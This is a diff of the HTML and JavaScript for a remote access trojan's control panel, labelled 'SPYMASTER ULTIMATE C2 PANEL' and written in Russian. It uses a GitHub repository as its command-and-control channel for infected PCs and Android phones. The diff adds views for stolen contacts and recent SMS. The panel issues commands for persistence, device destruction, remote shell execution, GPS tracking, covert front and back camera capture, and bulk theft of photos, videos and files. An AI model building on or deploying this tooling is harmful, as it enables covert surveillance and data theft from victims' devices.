@@ -11,7 +11,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 100%);
             font-family: 'Share Tech Mono', 'Courier New', monospace;
@@ -20,7 +20,6 @@
             min-height: 100vh;
         }
 
-        /* ============= КОСМИЧЕСКИЙ ФОН ============= */
         .stars, .twinkling, .planet {
             position: fixed;
             top: 0;
@@ -94,7 +93,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* ============= ОСНОВНОЙ КОНТЕЙНЕР ============= */
         .container {
             position: relative;
             z-index: 1;
@@ -103,7 +101,6 @@
             padding: 10px;
         }
 
-        /* ============= GLITCH ЭФФЕКТ ДЛЯ ASCII ============= */
         .glitch {
             position: relative;
             animation: glitch 3s infinite;
@@ -147,7 +144,6 @@
             80% { clip-path: inset(5% 0 80% 0); transform: translate(-1px, 1px); }
         }
 
-        /* ============= ПЕРЕКЛЮЧАТЕЛЬ РЕЖИМОВ ============= */
         .mode-switch {
             display: flex;
             justify-content: center;
@@ -195,7 +191,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ============= СТАТУС БАР ============= */
         .status-bar, .android-status {
             background: rgba(15, 18, 53, 0.8);
             backdrop-filter: blur(10px);
@@ -244,14 +239,12 @@
             font-weight: bold;
         }
 
-        /* ============= ОСНОВНОЙ КОНТЕНТ ============= */
         .main-content {
             display: flex;
             gap: 20px;
             flex-wrap: wrap;
         }
 
-        /* ============= ПАНЕЛИ ============= */
         .panel {
             background: rgba(15, 18, 53, 0.9);
             backdrop-filter: blur(10px);
@@ -285,7 +278,6 @@
             letter-spacing: 1px;
         }
 
-        /* ============= ВКЛАДКИ ============= */
         .tabs {
             display: flex;
             gap: 5px;
@@ -321,7 +313,6 @@
             display: block;
         }
 
-        /* ============= НЕОН КНОПКИ ============= */
         .neon-btn {
             background: transparent;
             border: 1px solid #00ff41;
@@ -374,7 +365,6 @@
             color: #00ff41;
         }
 
-        /* ============= КОМАНДЫ ============= */
         .quick-commands {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -450,7 +440,6 @@
             padding: 8px;
         }
 
-        /* ============= КЛИЕНТЫ ============= */
         .client-select {
             padding: 15px;
             border-bottom: 1px solid rgba(0,255,65,0.2);
@@ -483,7 +472,6 @@
             box-shadow: 0 0 10px rgba(0,255,65,0.3);
         }
 
-        /* ============= ЛОГИ ============= */
         .log-container {
             font-size: 12px;
             line-height: 1.5;
@@ -503,7 +491,6 @@
         .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
         .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
 
-        /* ============= СКРИНШОТЫ ============= */
         .screens-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
@@ -530,7 +517,6 @@
             object-fit: cover;
         }
 
-        /* ============= ФАЙЛЫ ============= */
         .file-item {
             background: #0a0e27;
             border: 1px solid #00ff41;
@@ -553,7 +539,6 @@
             border-radius: 5px;
         }
 
-        /* ============= HELP ============= */
         .commands-help {
             padding: 15px;
         }
@@ -582,7 +567,6 @@
             color: #ffaa00;
         }
 
-        /* ============= ФУТЕР ============= */
         .footer {
             margin-top: 20px;
             padding: 10px;
@@ -595,7 +579,6 @@
             flex-wrap: wrap;
         }
 
-        /* ============= АДАПТИВНОСТЬ ============= */
         @media (max-width: 768px) {
             .main-content {
                 flex-direction: column;
@@ -633,7 +616,6 @@
             }
         }
 
-        /* ============= СКРОЛЛБАР ============= */
         ::-webkit-scrollbar {
             width: 8px;
             height: 8px;
@@ -660,7 +642,6 @@
     <div class="planet"></div>
 
     <div class="container">
-        <!-- Хакерский ASCII заголовок с анимацией -->
         <div class="ascii-header">
             <pre class="glitch" data-text="
 ╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
@@ -703,49 +684,42 @@
             </pre>
         </div>
 
-        <!-- Переключатель режимов -->
         <div class="mode-switch">
             <button class="mode-btn active" data-mode="pc">💻 PC RAT</button>
             <button class="mode-btn" data-mode="android">📱 ANDROID RAT</button>
         </div>
 
-        <!-- ==================== PC РЕЖИМ ==================== -->
+        <!-- PC Mode -->
         <div id="pcMode" class="mode-content active">
-            <!-- Статус бар -->
             <div class="status-bar">
                 <div class="status-indicator" id="statusIndicator"></div>
                 <span id="statusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
-                <div class="stats" id="stats">
+                <div class="stats">
                     <span>📄 РЕЗУЛЬТАТОВ: <span id="resultsCount">0</span></span>
                     <span>📸 СКРИНШОТОВ: <span id="screensCount">0</span></span>
                     <span>💻 КЛИЕНТОВ: <span id="clientsCount">0</span></span>
                 </div>
             </div>
 
-            <!-- Основной контент PC -->
             <div class="main-content">
                 <div class="panel commands-panel">
                     <div class="panel-header">🎯 ОТПРАВКА КОМАНД</div>
-                    
                     <div class="client-select">
                         <label>📱 ВЫБРАТЬ КЛИЕНТА:</label>
                         <select id="clientSelect">
                             <option value="all">ВСЕ КЛИЕНТЫ</option>
                         </select>
                     </div>
-
                     <div class="quick-commands">
                         <button class="cmd-btn neon-btn" data-cmd="/info">📱 INFO</button>
                         <button class="cmd-btn neon-btn" data-cmd="/screenshot">📸 SCREEN</button>
                         <button class="cmd-btn neon-btn" data-cmd="/persist">🔒 PERSIST</button>
                         <button class="cmd-btn neon-btn" data-cmd="/destroy">💀 DESTROY</button>
                     </div>
-
                     <div class="custom-command">
                         <input type="text" id="customCmd" placeholder="Введите команду...">
                         <button id="sendCustomBtn" class="neon-btn">📨 ОТПРАВИТЬ</button>
                     </div>
-
                     <div class="advanced-commands">
                         <div class="section-title">⚙️ РАСШИРЕННЫЕ КОМАНДЫ</div>
                         <div class="cmd-group">
@@ -761,7 +735,6 @@
                             <button class="cmd-small neon-btn" id="shellBtn">💻 EXECUTE</button>
                         </div>
                     </div>
-
                     <div class="repo-controls">
                         <button id="clearCommandsBtn" class="danger-btn neon-btn">🗑 ОЧИСТИТЬ КОМАНДЫ</button>
                         <button id="clearAllBtn" class="danger-btn neon-btn">💣 ОЧИСТИТЬ ВСЁ</button>
@@ -780,31 +753,18 @@
                             <button class="tab-btn" data-tab="commands-help">📖 КОМАНДЫ</button>
                         </div>
                     </div>
-                    
                     <div id="logsTab" class="tab-content active">
-                        <div class="log-container" id="logContainer">
-                            <div class="log-entry system">[СИСТЕМА] Панель управления запущена</div>
-                        </div>
+                        <div class="log-container" id="logContainer"><div class="log-entry system">[СИСТЕМА] Панель управления запущена</div></div>
                     </div>
-
                     <div id="clientsTab" class="tab-content">
-                        <div class="clients-list" id="clientsList">
-                            <div class="empty-message">Нет подключенных клиентов</div>
-                        </div>
+                        <div class="clients-list" id="clientsList"><div class="empty-message">Нет подключенных клиентов</div></div>
                     </div>
-
                     <div id="screensTab" class="tab-content">
-                        <div class="screens-grid" id="screensGrid">
-                            <div class="empty-message">Нет скриншотов</div>
-                        </div>
+                        <div class="screens-grid" id="screensGrid"><div class="empty-message">Нет скриншотов</div></div>
                     </div>
-
                     <div id="filesTab" class="tab-content">
-                        <div class="files-list" id="filesList">
-                            <div class="empty-message">Нет загруженных файлов</div>
-                        </div>
+                        <div class="files-list" id="filesList"><div class="empty-message">Нет загруженных файлов</div></div>
                     </div>
-
                     <div id="commandsHelpTab" class="tab-content">
                         <div class="commands-help">
                             <h3>📖 ДОСТУПНЫЕ КОМАНДЫ (PC)</h3>
@@ -823,12 +783,12 @@
             </div>
         </div>
 
-        <!-- ==================== ANDROID РЕЖИМ ==================== -->
+        <!-- Android Mode -->
         <div id="androidMode" class="mode-content">
             <div class="status-bar android-status">
                 <div class="status-indicator" id="androidStatusIndicator"></div>
                 <span id="androidStatusText">ПРОВЕРКА ПОДКЛЮЧЕНИЯ...</span>
-                <div class="stats" id="androidStats">
+                <div class="stats">
                     <span>📱 УСТРОЙСТВ: <span id="androidDevicesCount">0</span></span>
                     <span>📍 GPS: <span id="androidGpsCount">0</span></span>
                 </div>
@@ -837,7 +797,6 @@
             <div class="main-content">
                 <div class="panel commands-panel">
                     <div class="panel-header">🎯 ANDROID КОМАНДЫ</div>
-                    
                     <div class="client-select">
                         <label>📱 ВЫБРАТЬ УСТРОЙСТВО:</label>
                         <select id="androidClientSelect">
@@ -845,30 +804,18 @@
                         </select>
                     </div>
 
-                    <!-- Основные команды -->
                     <div class="quick-commands android-commands">
                         <button class="cmd-btn neon-btn" data-android-cmd="/info">📱 INFO</button>
                         <button class="cmd-btn neon-btn" data-android-cmd="/location">📍 GPS</button>
-                        <button class="cmd-btn neon-btn" data-android-cmd="/contacts">📞 CONTACTS</button>
-                        <button class="cmd-btn neon-btn" data-android-cmd="/sms">💬 SMS</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/contacts">📞 КОНТАКТЫ</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/sms_recent">💬 SMS (30 мин)</button>
                         <button class="cmd-btn neon-btn" data-android-cmd="/camera">📸 CAM(BACK)</button>
                         <button class="cmd-btn neon-btn" data-android-cmd="/camera_front">🤳 CAM(FRONT)</button>
-                        <button class="cmd-btn neon-btn" data-android-cmd="/screenshot">🖼️ SCREEN</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/scan_images">🖼️ ВСЕ ФОТО</button>
+                        <button class="cmd-btn neon-btn" data-android-cmd="/scan_videos">🎬 ВСЕ ВИДЕО</button>
                         <button class="cmd-btn neon-btn" data-android-cmd="/destroy">💀 DESTROY</button>
                     </div>
 
-                    <!-- ГАЛЕРЕЯ И МЕДИА -->
-                    <div class="advanced-commands">
-                        <div class="section-title">🎬 ГАЛЕРЕЯ И МЕДИА</div>
-                        <div class="cmd-group">
-                            <button class="cmd-small neon-btn" id="androidGalleryImagesBtn">🖼️ ФОТО ГАЛЕРЕЯ</button>
-                            <button class="cmd-small neon-btn" id="androidGalleryVideosBtn">🎬 ВИДЕО ГАЛЕРЕЯ</button>
-                            <button class="cmd-small neon-btn" id="androidAudioBtn">🎙️ ЗАПИСЬ АУДИО</button>
-                            <button class="cmd-small neon-btn" id="androidAppsBtn">📱 ПРИЛОЖЕНИЯ</button>
-                        </div>
-                    </div>
-
-                    <!-- ФАЙЛЫ И СИСТЕМА -->
                     <div class="advanced-commands">
                         <div class="section-title">📁 ФАЙЛЫ И СИСТЕМА</div>
                         <div class="cmd-group">
@@ -880,12 +827,11 @@
                             <button class="cmd-small neon-btn" id="androidDownloadBtn">⬇️ DOWNLOAD</button>
                         </div>
                         <div class="cmd-group">
-                            <input type="text" id="androidShellCmd" placeholder="Shell команда (ls, ps, etc)">
+                            <input type="text" id="androidShellCmd" placeholder="Shell команда">
                             <button class="cmd-small neon-btn" id="androidShellBtn">💻 EXECUTE</button>
                         </div>
                     </div>
 
-                    <!-- SMS И ЗВОНКИ -->
                     <div class="advanced-commands">
                         <div class="section-title">📞 SMS И ЗВОНКИ</div>
                         <div class="cmd-group">
@@ -919,44 +865,34 @@
                             <button class="tab-btn" data-android-tab="devices">📱 УСТРОЙСТВА</button>
                             <button class="tab-btn" data-android-tab="photos">📸 ФОТО</button>
                             <button class="tab-btn" data-android-tab="gallery">🖼️ ГАЛЕРЕЯ</button>
-                            <button class="tab-btn" data-android-tab="commands-help">📖 КОМАНДЫ</button>
                             <button class="tab-btn" data-android-tab="contacts">📞 КОНТАКТЫ</button>
                             <button class="tab-btn" data-android-tab="sms">💬 SMS</button>
+                            <button class="tab-btn" data-android-tab="commands-help">📖 КОМАНДЫ</button>
                         </div>
                     </div>
-                    <div id="androidContactsTab" class="tab-content">
-                       <div class="log-container" id="androidContactsContainer">
-                          <div class="log-entry system">[КОНТАКТЫ] Здесь будут все контакты</div>
-                      </div>
-                    </div>
-
-                     <div id="androidSmsTab" class="tab-content">
-                        <div class="log-container" id="androidSmsContainer">
-                          <div class="log-entry system">[SMS] Здесь будут SMS за последние 30 минут</div>
-                        </div>
-                     </div>
+                    
                     <div id="androidLogsTab" class="tab-content active">
-                        <div class="log-container" id="androidLogContainer">
-                            <div class="log-entry system">[СИСТЕМА] Android панель запущена</div>
-                        </div>
+                        <div class="log-container" id="androidLogContainer"><div class="log-entry system">[СИСТЕМА] Android панель запущена</div></div>
                     </div>
 
                     <div id="androidDevicesTab" class="tab-content">
-                        <div class="clients-list" id="androidDevicesList">
-                            <div class="empty-message">Нет подключенных устройств</div>
-                        </div>
+                        <div class="clients-list" id="androidDevicesList"><div class="empty-message">Нет подключенных устройств</div></div>
                     </div>
 
                     <div id="androidPhotosTab" class="tab-content">
-                        <div class="screens-grid" id="androidPhotosGrid">
-                            <div class="empty-message">Нет фото</div>
-                        </div>
+                        <div class="screens-grid" id="androidPhotosGrid"><div class="empty-message">Нет фото</div></div>
                     </div>
 
                     <div id="androidGalleryTab" class="tab-content">
-                        <div class="log-container" id="androidGalleryContainer">
-                            <div class="log-entry system">[ГАЛЕРЕЯ] Здесь будут фото и видео из галереи</div>
-                        </div>
+                        <div class="log-container" id="androidGalleryContainer"><div class="log-entry system">[ГАЛЕРЕЯ] Здесь будут фото и видео из галереи</div></div>
+                    </div>
+
+                    <div id="androidContactsTab" class="tab-content">
+                        <div class="log-container" id="androidContactsContainer"><div class="log-entry system">[КОНТАКТЫ] Здесь будут все контакты</div></div>
+                    </div>
+
+                    <div id="androidSmsTab" class="tab-content">
+                        <div class="log-container" id="androidSmsContainer"><div class="log-entry system">[SMS] Здесь будут SMS за последние 30 минут</div></div>
                     </div>
 
                     <div id="androidCommandsHelpTab" class="tab-content">
@@ -965,15 +901,12 @@
                             <div class="help-grid">
                                 <div class="help-card"><code>/info</code> - Информация об устройстве</div>
                                 <div class="help-card"><code>/location</code> - GPS координаты</div>
-                                <div class="help-card"><code>/contacts</code> - Список контактов</div>
-                                <div class="help-card"><code>/sms</code> - Чтение SMS</div>
+                                <div class="help-card"><code>/contacts</code> - Все контакты</div>
+                                <div class="help-card"><code>/sms_recent</code> - SMS за 30 минут</div>
                                 <div class="help-card"><code>/camera</code> - Фото с задней камеры</div>
                                 <div class="help-card"><code>/camera_front</code> - Фото с фронтальной камеры</div>
-                                <div class="help-card"><code>/screenshot</code> - Скриншот экрана</div>
-                                <div class="help-card"><code>/gallery_images</code> - Фото из галереи</div>
-                                <div class="help-card"><code>/gallery_videos</code> - Видео из галереи</div>
-                                <div class="help-card"><code>/audio</code> - Запись аудио (10 сек)</div>
-                                <div class="help-card"><code>/apps</code> - Список приложений</div>
+                                <div class="help-card"><code>/scan_images</code> - Все фото на устройстве</div>
+                                <div class="help-card"><code>/scan_videos</code> - Все видео на устройстве</div>
                                 <div class="help-card"><code>/files /sdcard</code> - Список файлов</div>
                                 <div class="help-card"><code>/download /sdcard/file</code> - Скачать файл</div>
                                 <div class="help-card"><code>/cmd ls</code> - Shell команда</div>
@@ -994,16 +927,13 @@
     </div>
 
     <script>
-        // ============= SPYMASTER ULTIMATE C2 PANEL =============
+        // SPYMASTER ULTIMATE C2 PANEL - ПОЛНАЯ ВЕРСИЯ
         // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
-        // ВЕРСИЯ: 4.0 (PC + ANDROID)
 
-        // ============= КОНФИГУРАЦИЯ =============
         let GITHUB_USERNAME = "твой_логин";
         let GITHUB_REPO = "rat_c2";
         let GITHUB_TOKEN = "";
 
-        // Загрузка сохранённых данных
         try {
             if (typeof CONFIG !== 'undefined') {
                 GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
@@ -1031,20 +961,17 @@
             }
         }
 
-        // ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
         const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
         const HEADERS = {
             "Authorization": `token ${GITHUB_TOKEN}`,
             "Accept": "application/vnd.github.v3+json"
         };
 
-        // PC переменные
         let pcClients = [];
         let pcSeenFiles = [];
         let pcAutoRefresh = null;
         let pcCurrentClient = "all";
 
-        // Android переменные
         let androidDevices = [];
         let androidSeenFiles = [];
         let androidAutoRefresh = null;
@@ -1052,7 +979,6 @@
 
         let currentMode = "pc";
 
-        // ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
         function addLog(message, type = "system", isAndroid = false) {
             const containerId = isAndroid ? "androidLogContainer" : "logContainer";
             const logContainer = document.getElementById(containerId);
@@ -1078,6 +1004,30 @@
             while (container.children.length > 300) {
                 container.removeChild(container.lastChild);
             }
+        }
+
+        function displayContacts(content) {
+            const container = document.getElementById("androidContactsContainer");
+            if (!container) return;
+            container.innerHTML = "";
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement("div");
+            logEntry.className = "log-entry result";
+            const formattedContent = content.replace(/\n/g, '<br>');
+            logEntry.innerHTML = `<span style="color:#666">[${time}]</span><br>${formattedContent}`;
+            container.appendChild(logEntry);
+        }
+
+        function displaySms(content) {
+            const container = document.getElementById("androidSmsContainer");
+            if (!container) return;
+            container.innerHTML = "";
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement("div");
+            logEntry.className = "log-entry result";
+            const formattedContent = content.replace(/\n/g, '<br>');
+            logEntry.innerHTML = `<span style="color:#666">[${time}]</span><br>${formattedContent}`;
+            container.appendChild(logEntry);
         }
 
         function showNotification(message, type = "info") {
@@ -1111,7 +1061,6 @@
             return div.innerHTML;
         }
 
-        // ============= ОТПРАВКА КОМАНД (ОБЩАЯ) =============
         async function sendCommandToGithub(command, isAndroid = false) {
             const targetClient = isAndroid ? (androidCurrentDevice || "all") : (pcCurrentClient || "all");
             let finalCommand = command;
@@ -1163,7 +1112,6 @@
             }
         }
 
-        // ============= ПАРСИНГ КЛИЕНТОВ =============
         function parseClientInfo(content, isAndroid = false) {
             if (content.includes("[Connected]") || content.includes("PC:") || content.includes("Device:")) {
                 let pcMatch = content.match(/PC:\s*([^\n]+)/);
@@ -1201,7 +1149,6 @@
             }
         }
 
-        // ============= ОТОБРАЖЕНИЕ СКРИНШОТА =============
         function displayScreenshot(base64Data, filename, isAndroid = false) {
             const gridId = isAndroid ? "androidPhotosGrid" : "screensGrid";
             const grid = document.getElementById(gridId);
@@ -1209,14 +1156,8 @@
             
             const card = document.createElement("div");
             card.className = "screenshot-card";
-            card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:10px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
-            card.onmouseover = () => card.style.transform = "scale(1.02)";
-            card.onmouseout = () => card.style.transform = "scale(1)";
-            
             const img = document.createElement("img");
             img.src = `data:image/png;base64,${base64Data}`;
-            img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
-            
             card.onclick = () => {
                 const modal = document.createElement("div");
                 modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
@@ -1227,25 +1168,18 @@
                 modal.onclick = () => modal.remove();
                 document.body.appendChild(modal);
             };
-            
             const info = document.createElement("div");
             info.style.cssText = "padding:8px;font-size:10px;text-align:center";
             info.innerText = filename;
-            
             card.appendChild(img);
             card.appendChild(info);
-            
             if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
                 grid.innerHTML = "";
             }
             grid.insertBefore(card, grid.firstChild);
-            
-            while (grid.children.length > 20) {
-                grid.removeChild(grid.lastChild);
-            }
+            while (grid.children.length > 20) grid.removeChild(grid.lastChild);
         }
 
-        // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
         async function loadResults(isAndroid = false) {
             try {
                 const response = await fetch(API_URL, { headers: HEADERS });
@@ -1258,6 +1192,8 @@
                 const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_"));
                 const photoFiles = files.filter(f => f.name.startsWith("photo_"));
                 const galleryFiles = files.filter(f => f.name.startsWith("gallery_"));
+                const contactsFiles = files.filter(f => f.name.startsWith("contacts_"));
+                const smsFiles = files.filter(f => f.name.startsWith("sms_"));
                 const fileDownloads = files.filter(f => f.name.startsWith("file_"));
                 
                 if (isAndroid) {
@@ -1269,7 +1205,6 @@
                     document.getElementById("clientsCount").innerText = pcClients.length;
                 }
                 
-                // Обработка результатов
                 const allResultFiles = isAndroid ? [...results, ...photoFiles] : results;
                 for (const file of allResultFiles) {
                     const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
@@ -1278,14 +1213,29 @@
                         const content = await fetch(file.download_url).then(r => r.text());
                         addLog(`📥 ${file.name}`, "result", isAndroid);
                         const lines = content.split('\n').slice(0, 5);
-                        for (const line of lines) {
-                            if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result", isAndroid);
-                        }
+                        for (const line of lines) if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result", isAndroid);
                         parseClientInfo(content, isAndroid);
                     }
                 }
                 
-                // Обработка галереи
+                for (const file of contactsFiles) {
+                    if (!androidSeenFiles.includes(file.name)) {
+                        androidSeenFiles.push(file.name);
+                        const content = await fetch(file.download_url).then(r => r.text());
+                        displayContacts(content);
+                        addLog(`📞 ПОЛУЧЕНЫ КОНТАКТЫ: ${file.name}`, "success", true);
+                    }
+                }
+                
+                for (const file of smsFiles) {
+                    if (!androidSeenFiles.includes(file.name)) {
+                        androidSeenFiles.push(file.name);
+                        const content = await fetch(file.download_url).then(r => r.text());
+                        displaySms(content);
+                        addLog(`💬 ПОЛУЧЕНЫ SMS: ${file.name}`, "success", true);
+                    }
+                }
+                
                 for (const file of galleryFiles) {
                     if (!androidSeenFiles.includes(file.name)) {
                         androidSeenFiles.push(file.name);
@@ -1299,14 +1249,12 @@
                     }
                 }
                 
-                // Обработка скриншотов/фото
                 const allImages = isAndroid ? photoFiles : screenshotFiles;
                 for (const file of allImages) {
                     const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
                     if (!seenList.includes(file.name)) {
                         seenList.push(file.name);
                         const content = await fetch(file.download_url).then(r => r.text());
-                        
                         if (isBase64Image(content)) {
                             addLog(`📸 ${file.name}`, "success", isAndroid);
                             displayScreenshot(content, file.name, isAndroid);
@@ -1319,23 +1267,18 @@
                                 card.className = "screenshot-card";
                                 const img = document.createElement("img");
                                 img.src = file.download_url + "?t=" + Date.now();
-                                img.style.cssText = "width:100%;height:150px;object-fit:cover";
                                 card.onclick = () => window.open(file.download_url, '_blank');
                                 const info = document.createElement("div");
-                                info.style.cssText = "padding:8px;font-size:10px;text-align:center";
                                 info.innerText = file.name;
                                 card.appendChild(img);
                                 card.appendChild(info);
-                                if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
-                                    grid.innerHTML = "";
-                                }
+                                if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) grid.innerHTML = "";
                                 grid.insertBefore(card, grid.firstChild);
                             }
                         }
                     }
                 }
                 
-                // Обновление списка файлов для PC
                 if (!isAndroid) {
                     const filesList = document.getElementById("filesList");
                     if (filesList) {
@@ -1344,10 +1287,7 @@
                             for (const file of fileDownloads.slice(-20).reverse()) {
                                 const item = document.createElement("div");
                                 item.className = "file-item";
-                                item.innerHTML = `
-                                    <span>📄 ${file.name}</span>
-                                    <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
-                                `;
+                                item.innerHTML = `<span>📄 ${file.name}</span><button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>`;
                                 filesList.appendChild(item);
                             }
                         } else {
@@ -1355,22 +1295,17 @@
                         }
                     }
                 }
-                
             } catch (error) {
                 addLog(`❌ Ошибка загрузки: ${error.message}`, "error", isAndroid);
             }
         }
 
-        // ============= ОБНОВЛЕНИЕ СПИСКОВ =============
         function updatePCClientsList() {
             const select = document.getElementById("clientSelect");
             if (select) {
                 select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
-                for (const client of pcClients) {
-                    select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
-                }
+                for (const client of pcClients) select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
             }
-            
             const clientsDiv = document.getElementById("clientsList");
             if (clientsDiv) {
                 if (pcClients.length > 0) {
@@ -1378,16 +1313,8 @@
                     for (const client of pcClients) {
                         const card = document.createElement("div");
                         card.className = "client-card";
-                        card.onclick = () => {
-                            document.getElementById("clientSelect").value = client.id;
-                            pcCurrentClient = client.id;
-                            addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${client.id}`, "success");
-                        };
-                        card.innerHTML = `
-                            <div style="font-weight:bold">🖥️ ${escapeHtml(client.id)}</div>
-                            <div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div>
-                            <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
-                        `;
+                        card.onclick = () => { document.getElementById("clientSelect").value = client.id; pcCurrentClient = client.id; addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${client.id}`, "success"); };
+                        card.innerHTML = `<div style="font-weight:bold">🖥️ ${escapeHtml(client.id)}</div><div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div><div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>`;
                         clientsDiv.appendChild(card);
                     }
                 } else {
@@ -1400,11 +1327,8 @@
             const select = document.getElementById("androidClientSelect");
             if (select) {
                 select.innerHTML = '<option value="all">📱 ВСЕ УСТРОЙСТВА</option>';
-                for (const device of androidDevices) {
-                    select.innerHTML += `<option value="${device.id}">📱 ${device.id}</option>`;
-                }
+                for (const device of androidDevices) select.innerHTML += `<option value="${device.id}">📱 ${device.id}</option>`;
             }
-            
             const devicesDiv = document.getElementById("androidDevicesList");
             if (devicesDiv) {
                 if (androidDevices.length > 0) {
@@ -1412,15 +1336,8 @@
                     for (const device of androidDevices) {
                         const card = document.createElement("div");
                         card.className = "client-card";
-                        card.onclick = () => {
-                            document.getElementById("androidClientSelect").value = device.id;
-                            androidCurrentDevice = device.id;
-                            addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${device.id}`, "success", true);
-                        };
-                        card.innerHTML = `
-                            <div style="font-weight:bold">📱 ${escapeHtml(device.id)}</div>
-                            <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(device.firstSeen)}</div>
-                        `;
+                        card.onclick = () => { document.getElementById("androidClientSelect").value = device.id; androidCurrentDevice = device.id; addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${device.id}`, "success", true); };
+                        card.innerHTML = `<div style="font-weight:bold">📱 ${escapeHtml(device.id)}</div><div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(device.firstSeen)}</div>`;
                         devicesDiv.appendChild(card);
                     }
                 } else {
@@ -1429,7 +1346,6 @@
             }
         }
 
-        // ============= ОЧИСТКА КОМАНД =============
         async function clearCommands() {
             try {
                 const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
@@ -1438,22 +1354,14 @@
                     await fetch(`${API_URL}/commands.txt`, {
                         method: "PUT",
                         headers: HEADERS,
-                        body: JSON.stringify({
-                            message: "Clear commands",
-                            content: btoa(""),
-                            sha: data.sha,
-                            branch: "main"
-                        })
+                        body: JSON.stringify({ message: "Clear commands", content: btoa(""), sha: data.sha, branch: "main" })
                     });
                     addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success", false);
                     addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success", true);
                 }
-            } catch (error) {
-                addLog(`❌ Ошибка очистки: ${error.message}`, "error", false);
-            }
+            } catch (error) { addLog(`❌ Ошибка очистки: ${error.message}`, "error", false); }
         }
 
-        // ============= ТЕСТ ПОДКЛЮЧЕНИЯ =============
         async function testConnection() {
             addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system", false);
             try {
@@ -1465,34 +1373,26 @@
                     const statusText = document.getElementById("statusText");
                     if (indicator) indicator.classList.add("online");
                     if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
-                    
                     const androidIndicator = document.getElementById("androidStatusIndicator");
                     const androidStatusText = document.getElementById("androidStatusText");
                     if (androidIndicator) androidIndicator.classList.add("online");
                     if (androidStatusText) androidStatusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
-                    
                     return true;
                 } else {
                     addLog(`❌ ОШИБКА: ${response.status}`, "error", false);
                     return false;
                 }
-            } catch (error) {
-                addLog(`❌ ОШИБКА: ${error.message}`, "error", false);
-                return false;
-            }
+            } catch (error) { addLog(`❌ ОШИБКА: ${error.message}`, "error", false); return false; }
         }
 
-        // ============= АВТООБНОВЛЕНИЕ =============
         function startAutoRefresh() {
             if (pcAutoRefresh) clearInterval(pcAutoRefresh);
             if (androidAutoRefresh) clearInterval(androidAutoRefresh);
-            
             pcAutoRefresh = setInterval(() => loadResults(false), 5000);
             androidAutoRefresh = setInterval(() => loadResults(true), 5000);
             addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system", false);
         }
 
-        // ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
         function switchMode(mode) {
             currentMode = mode;
             document.querySelectorAll('.mode-content').forEach(el => el.classList.remove('active'));
@@ -1501,15 +1401,13 @@
             document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
         }
 
-        // ============= ОЧИСТКА ВСЕГО =============
         async function clearAllFiles() {
             if (!confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) return;
-            
             try {
                 const response = await fetch(API_URL, { headers: HEADERS });
                 if (response.ok) {
                     const files = await response.json();
